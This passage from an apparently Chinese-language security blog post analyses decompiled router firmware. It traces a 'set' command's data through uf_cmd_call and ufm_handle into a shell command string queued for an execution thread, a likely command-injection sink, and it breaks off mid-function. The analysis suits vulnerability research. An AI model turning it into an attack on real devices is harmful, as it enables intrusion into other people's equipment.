class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">          <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">          <span class="number">538</span>,</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">9</span>],</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">10</span>]);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(_20_23_is_data[<span class="number">5</span>], <span class="string">&quot;get&quot;</span>)</span><br><span class="line">        &amp;&amp; ((v76 = _20_23_is_data[<span class="number">14</span>], !<span class="built_in">strcmp</span>(_20_23_is_data[<span class="number">14</span>], <span class="string">&quot;configPath&quot;</span>))</span><br><span class="line">         || !<span class="built_in">strcmp</span>(v76, <span class="string">&quot;configVersion&quot;</span>)</span><br><span class="line">         || !<span class="built_in">strcmp</span>(v76, <span class="string">&quot;configDefault&quot;</span>)) )</span><br><span class="line">      &#123;</span><br><span class="line">        v77 = _20_23_is_data[<span class="number">15</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !_20_23_is_data[<span class="number">15</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          v78 = _20_23_is_data[<span class="number">24</span>];</span><br><span class="line">          <span class="keyword">goto</span> LABEL_184;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v77 = _20_23_is_data[<span class="number">14</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      _20_23_is_data[<span class="number">24</span>] = find_module_info(v77, &amp;_20_23_is_data[<span class="number">26</span>]);</span><br><span class="line">      v78 = _20_23_is_data[<span class="number">24</span>];</span><br><span class="line">LABEL_184:</span><br><span class="line">      <span class="keyword">if</span> ( v78 )</span><br><span class="line">      &#123;</span><br><span class="line">        v79 = addr;</span><br><span class="line">        <span class="keyword">if</span> ( !*(_BYTE *)(_20_23_is_data[<span class="number">0</span>] + <span class="number">48</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          pthread_mutex_lock(v78 + <span class="number">112</span>);</span><br><span class="line">          v98 = _20_23_is_data[<span class="number">24</span>];</span><br><span class="line">          <span class="keyword">if</span> ( _sigsetjmp(v96, <span class="number">0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            pthread_mutex_unlock(v98 + <span class="number">112</span>);</span><br><span class="line">            _pthread_unwind_next(v96);</span><br><span class="line">          &#125;</span><br><span class="line">          _pthread_register_cancel(v96);</span><br><span class="line">          v80 = *(<span class="type">const</span> <span class="type">char</span> **)(addr + <span class="number">12</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v80 &amp;&amp; *v80 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( HIBYTE(_20_23_is_data[<span class="number">4</span>]) &amp;&amp; g_debug &gt;= <span class="number">2</span> || g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">              uf_log_printf(</span><br><span class="line">                uf_log,</span><br><span class="line">                <span class="string">&quot;(%s %s %d)%s %s -m %s &#x27;%s&#x27; [mutex:%d]&quot;</span>,</span><br><span class="line">                <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">                <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">                <span class="number">579</span>,</span><br><span class="line">                uf_call_type_str[_20_23_is_data[<span class="number">7</span>]],</span><br><span class="line">                (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">5</span>],</span><br><span class="line">                (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>],</span><br><span class="line">                v80,</span><br><span class="line">                _20_23_is_data[<span class="number">24</span>] + <span class="number">112</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( HIBYTE(_20_23_is_data[<span class="number">4</span>]) &amp;&amp; g_debug &gt;= <span class="number">2</span> || g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            uf_log_printf(</span><br><span class="line">              uf_log,</span><br><span class="line">              <span class="string">&quot;(%s %s %d)%s %s -m %s [mutex:%d]&quot;</span>,</span><br><span class="line">              <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">              <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">              <span class="number">583</span>,</span><br><span class="line">              uf_call_type_str[_20_23_is_data[<span class="number">7</span>]],</span><br><span class="line">              (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">5</span>],</span><br><span class="line">              (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>],</span><br><span class="line">              _20_23_is_data[<span class="number">24</span>] + <span class="number">112</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          v95 = ufm_handle((<span class="type">int</span>)_20_23_is_data);<span class="comment">// 命令执行点</span></span><br><span class="line">          pthread_mutex_unlock(_20_23_is_data[<span class="number">24</span>] + <span class="number">112</span>);</span><br><span class="line">          _pthread_unregister_cancel(v96);</span><br><span class="line">LABEL_211:</span><br></pre></td></tr></table></figure>

<p>就会发现之后有一个命令执行点ufm_handle，让我们先分析分析该函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;set&quot;</span>) || !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;add&quot;</span>) || !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;del&quot;</span>) || !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;update&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v28 = sub_40FD5C(a1);</span><br><span class="line">LABEL_169:</span><br><span class="line">      v1 = v28;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_176;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>由于我们的是set调用所以调用sub_40FD5C函数，经过分析调用sub_40CEAC(a1, a1 + 22, 0, 0) 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">snprintf</span>(&amp;v63[v67], v65, <span class="string">&quot; &#x27;%s&#x27;&quot;</span>, data);</span><br><span class="line">ufm_commit_add(<span class="number">0</span>, v63, <span class="number">1</span>, <span class="number">0</span>); </span><br></pre></td></tr></table></figure>

<p>主要的调用就是这两个，v63构成了shell</p>
<h4 id="ufm-commit-add"><a href="#ufm-commit-add" class="headerlink" title="ufm_commit_add"></a>ufm_commit_add</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">ufm_commit_add</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">unsigned</span> __int8 a3, <span class="type">const</span> <span class="type">char</span> **a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $s0</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v6 = async_cmd_push_queue(a1, a2, a3);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = v6;</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      sem_wait(v6 + <span class="number">36</span>);</span><br><span class="line">      *a4 = *(<span class="type">const</span> <span class="type">char</span> **)(v8 + <span class="number">52</span>);</span><br><span class="line">      v7 = *(_DWORD *)(v8 + <span class="number">56</span>);</span><br><span class="line">      sub_41AD10(v8);</span><br><span class="line">      <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">        uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)commit ret:%d, rbuf:%s&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;ufm_commit_add&quot;</span>, <span class="number">359</span>, v7, *a4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="async-cmd-push-queue"><a href="#async-cmd-push-queue" class="headerlink" title="async_cmd_push_queue"></a>async_cmd_push_queue</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">async_cmd_push_queue</span><span class="params">(_DWORD *a1, <span class="type">const</span> <span class="type">char</span> *a2, <span class="type">unsigned</span> __int8 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v20; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  <span class="keyword">if</span> ( dword_4360A4 &gt;= <span class="number">1001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(</span><br><span class="line">      uf_log,</span><br><span class="line">      <span class="string">&quot;ERROR (%s %s %d)[async cmd queue fulled!][%d]&quot;</span>,</span><br><span class="line">      <span class="string">&quot;ufm_thd.c&quot;</span>,</span><br><span class="line">      <span class="string">&quot;async_cmd_push_queue&quot;</span>,</span><br><span class="line">      <span class="number">78</span>,</span><br><span class="line">      <span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pthread_mutex_lock(&amp;unk_4360B8);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(<span class="number">68</span>);</span><br><span class="line">  v7 = v6;</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)memory malloc failed!&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;async_cmd_push_queue&quot;</span>, <span class="number">85</span>);</span><br><span class="line">LABEL_5:</span><br><span class="line">    v8 = &amp;unk_4360B8;</span><br><span class="line">LABEL_6:</span><br><span class="line">    pthread_mutex_unlock(v8);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">68</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v19 = strdup(a2);</span><br><span class="line">      *(_DWORD *)(v7 + <span class="number">28</span>) = v19;</span><br><span class="line">      <span class="keyword">if</span> ( v19 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)memory malloc failed![%s]&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;async_cmd_push_queue&quot;</span>, <span class="number">133</span>, a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)invalid commit para!&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;async_cmd_push_queue&quot;</span>, <span class="number">139</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(v7);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(v7, a1, <span class="number">28</span>);</span><br><span class="line">  v10 = a1[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !v10 || (v12 = strdup(v10), (*(_DWORD *)(v7 + <span class="number">16</span>) = v12) != <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)strdup failed!&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;async_cmd_push_queue&quot;</span>, <span class="number">97</span>);</span><br><span class="line">    v11 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a1[<span class="number">3</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = json_object_get();</span><br><span class="line">    *(_DWORD *)(v7 + <span class="number">12</span>) = v13;</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)strdup failed!&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;async_cmd_push_queue&quot;</span>, <span class="number">104</span>);</span><br><span class="line">      v11 = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">      uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)param obj[%x], para_obg[%x]&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ufm_thd.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;async_cmd_push_queue&quot;</span>,</span><br><span class="line">        <span class="number">107</span>,</span><br><span class="line">        a1[<span class="number">3</span>],</span><br><span class="line">        *(_DWORD *)(v7 + <span class="number">12</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  v14 = a1[<span class="number">6</span>];</span><br><span class="line">  <span class="keyword">if</span> ( v14 )</span><br><span class="line">  &#123;</span><br><span class="line">    v15 = strdup(v14);</span><br><span class="line">    *(_DWORD *)(v7 + <span class="number">24</span>) = v15;</span><br><span class="line">    <span class="keyword">if</span> ( !v15 )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)strdup failed!&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;async_cmd_push_queue&quot;</span>, <span class="number">112</span>);</span><br><span class="line">LABEL_22:</span><br><span class="line">      v16 = *(_DWORD *)(v7 + <span class="number">16</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v16 )</span><br><span class="line">        <span class="built_in">free</span>(v16);</span><br><span class="line">      v17 = *(_DWORD *)(v7 + <span class="number">12</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v17 )</span><br><span class="line">        json_object_put(v17);</span><br><span class="line">      v18 = *(_DWORD *)(v7 + <span class="number">24</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v18 )</span><br><span class="line">        <span class="built_in">free</span>(v18);</span><br><span class="line">      <span class="built_in">free</span>(v7);</span><br><span class="line">      v8 = &amp;unk_4360B8;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v11 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">LABEL_34:</span><br><span class="line">  v20 = (_DWORD *)dword_435DE0;</span><br><span class="line">  *(_DWORD *)(v7 + <span class="number">60</span>) = &amp;commit_task_head;</span><br><span class="line">  dword_435DE0 = v7 + <span class="number">60</span>;</span><br><span class="line">  v21 = dword_4360A4;</span><br><span class="line">  *(_DWORD *)(v7 + <span class="number">64</span>) = v20;</span><br><span class="line">  *v20 = v7 + <span class="number">60</span>;</span><br><span class="line">  dword_4360A4 = v21 + <span class="number">1</span>;</span><br><span class="line">  *(_BYTE *)(v7 + <span class="number">32</span>) = v3;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    sem_init(v7 + <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  pthread_mutex_unlock(&amp;unk_4360B8);</span><br><span class="line">  sem_post(&amp;unk_4360A8);</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数的主要功能是将异步命令推送到队列中</p>
<h5 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h5><p><strong>获取当前队列头指针</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v20 = (_DWORD *)dword_435DE0;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>dword_435DE0</code> 是一个全局变量，指向当前队列的头。将其值存储在 <code>v20</code> 中。</li>
</ul>
<p><strong>设置新任务的 <code>next</code> 指针</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)(v7 + <span class="number">60</span>) = &amp;commit_task_head;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>v7</code> 是新分配的任务结构的基地址。</li>
<li>假设任务结构的第 60 字节处存储的是指向下一个任务的指针。</li>
<li>将这个位置初始化为 <code>&amp;commit_task_head</code>，表示新任务的下一个任务是队列头（初始为空）。</li>
</ul>
<p><strong>更新队列头指针</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dword_435DE0 = v7 + <span class="number">60</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>将全局队列头指针 <code>dword_435DE0</code> 更新为新任务的 <code>next</code> 指针位置，即 <code>v7 + 60</code>。</li>
</ul>
<p><strong>保存当前队列长度</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v21 = dword_4360A4;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>dword_4360A4</code> 是当前队列的长度。将其值存储在 <code>v21</code> 中。</li>
</ul>
<p><strong>更新新任务的 <code>prev</code> 指针</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)(v7 + <span class="number">64</span>) = v20;</span><br></pre></td></tr></table></figure>

<ul>
<li>假设任务结构的第 64 字节处存储的是指向前一个任务的指针。</li>
<li>将这个位置设置为之前的队列头，即 <code>v20</code>。</li>
</ul>
<p><strong>更新之前头任务的 <code>next</code> 指针</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*v20 = v7 + <span class="number">60</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>将之前队列头任务的 <code>next</code> 指针更新为新任务的 <code>next</code> 指针位置，即 <code>v7 + 60</code>。</li>
</ul>
<p><strong>更新队列长度</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dword_4360A4 = v21 + <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>增加队列长度 <code>dword_4360A4</code> 的值。</li>
</ul>
<p><strong>设置任务状态</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_BYTE *)(v7 + <span class="number">32</span>) = v3;</span><br></pre></td></tr></table></figure>

<ul>
<li>假设任务结构的第 32 字节处存储的是任务状态。</li>
<li>将这个位置设置为参数 <code>v3</code> 的值。</li>
</ul>
<p><strong>初始化信号量（如果需要）</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!v3)</span><br><span class="line">  sem_init(v7 + <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>如果 <code>v3</code> 为 0，则初始化任务结构的第 36 字节处的信号量。</li>
</ul>
<p><strong>解锁互斥锁</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pthread_mutex_unlock(&amp;unk_4360B8);</span><br></pre></td></tr></table></figure>

<ul>
<li>解锁之前加的互斥锁 <code>unk_4360B8</code>。</li>
</ul>
<p><strong>释放信号量</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sem_post(&amp;unk_4360A8);</span><br></pre></td></tr></table></figure>

<ul>
<li>释放信号量 <code>unk_4360A8</code>，表示有新任务加入队列。</li>
</ul>
<p><strong>返回新任务的指针</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> v7;</span><br></pre></td></tr></table></figure>

<ul>
<li>返回新分配的任务结构的基地址 <code>v7</code>。</li>
</ul>
<p>注意到最后使用<code>sem_post</code>的原子操作，将信号量加上了<code>1</code>。因此，应该<strong>会有其他地方在检测到信号量发生改变后，对数据进行处理</strong>。</p>
<p>意味着其他地方应该是有sem_wait阻塞了一个线程的执行</p>
<blockquote>
<ul>
<li><code>sem_wait</code> 用于等待信号量。如果信号量的值为零，它会阻塞直到信号量的值大于零。</li>
<li><code>sem_post</code> 用于释放信号量，将信号量的值加一，并唤醒等待的线程（如果有）。</li>
<li>主要是实现线程间的同步和互斥，确保程序安全运行</li>
</ul>
</blockquote>
<p>对其进行交叉引用发现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">sub_41AFC8</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $a0</span></span><br><span class="line"></span><br><span class="line">  pthread_setcanceltype(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  v2 = pthread_self();</span><br><span class="line">  pthread_detach(v2);</span><br><span class="line">  prctl(<span class="number">15</span>, <span class="string">&quot;exec_cmd_task&quot;</span>);</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      sem_wait(&amp;unk_4360A8);</span><br><span class="line">      pthread_mutex_lock(<span class="number">4415672</span>);</span><br><span class="line">      v3 = commit_task_head;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span> *)commit_task_head == &amp;commit_task_head )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v4 = commit_task_head - <span class="number">60</span>;</span><br><span class="line">        *(_DWORD *)(*(_DWORD *)commit_task_head + <span class="number">4</span>) = *(_DWORD *)(commit_task_head + <span class="number">4</span>);</span><br><span class="line">        **(_DWORD **)(v3 + <span class="number">4</span>) = *(_DWORD *)v3;</span><br><span class="line">        *(_DWORD *)(v3 + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">        *(_DWORD *)v3 = <span class="number">0</span>;</span><br><span class="line">        